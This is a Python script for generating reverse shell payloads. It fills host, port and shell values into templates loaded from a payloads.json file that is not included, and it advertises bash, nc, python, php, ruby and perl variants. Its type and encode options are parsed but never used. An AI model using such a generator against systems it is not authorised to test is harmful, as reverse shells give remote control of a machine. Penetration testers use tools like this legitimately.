#!/usr/bin/python3

# I don't believe in license.
# You can do whatever you want with this tool.

import argparse
import colorama
from colorama import Fore, Style
import json

def banner():
    version = 1.0
    print(Fore.LIGHTGREEN_EX + """
                                                __         ____                                     __            
   ________ _   _____  _____________      _____/ /_  ___  / / /   ____ ____  ____  ___  _________ _/ /_____  _____
  / ___/ _ \ | / / _ \/ ___/ ___/ _ \    / ___/ __ \/ _ \/ / /   / __ `/ _ \/ __ \/ _ \/ ___/ __ `/ __/ __ \/ ___/
 / /  /  __/ |/ /  __/ /  (__  )  __/   (__  ) / / /  __/ / /   / /_/ /  __/ / / /  __/ /  / /_/ / /_/ /_/ / /    
/_/   \___/|___/\___/_/  /____/\___/   /____/_/ /_/\___/_/_/    \__, /\___/_/ /_/\___/_/   \__,_/\__/\____/_/     
                                                               /____/                                             

            + -- --=[ v""" + str(version) + """ by @0xkaneki

    """ + Style.RESET_ALL)


def generate_reverse_shell(host, port, type="bash", shell="sh"):
    with open("payloads.json") as json_file:
        payloads = json.load(json_file)
        
    payload = payloads[type].replace("$HOST", host).replace("$PORT", port).replace("$SHELL", shell)

    return payload


parser = argparse.ArgumentParser(usage="python3 reverse_shell_generator.py [-i/--host] HOST [-p/--port] PORT [OPTIONS]")
optional = parser._action_groups.pop()
required = parser.add_argument_group("required arguments")

required.add_argument("-i","--host",help="host listening the connection")
required.add_argument("-p","--port",help="port listening the connection")
optional.add_argument("-t","--type",help="language or tool - Options: bash, sh, nc, python, python3, php, ruby, perl")
optional.add_argument("-s","--shell",help="shell - Options: sh, bash")
optional.add_argument("-e","--encode",help="output encode - Options: base64, urlencode, hex")

parser._action_groups.append(optional)
args = parser.parse_args()

if (args.host):
    _host = args.host
else:
    _host = None

if (args.port):
    _port = args.port
else:
    _port = None

if (args.type):
    _type = args.type
else:
    _type = None

if (args.shell):
    _shell = args.shell
else:
    _shell = None

if (args.encode):
    _encode = args.encode
else:
    _encode = None

banner()
if (not _host) or (not _port):
    print("Incorrect usage")
    print("Usage: python3 reverse_shell_generator.py [-i/--host] HOST [-p/--port] PORT [OPTIONS]")
else:
    if not _shell:
        _shell = "bash"

    if (_shell != "sh") and (_shell != "bash"):
        print(Fore.LIGHTRED_EX + "-s/--shell only accept 'sh' and 'bash' values" + Style.RESET_ALL)
        exit()

    print(Fore.LIGHTGREEN_EX + "Payload: " + Style.RESET_ALL + generate_reverse_shell(_host, _port, shell=_shell))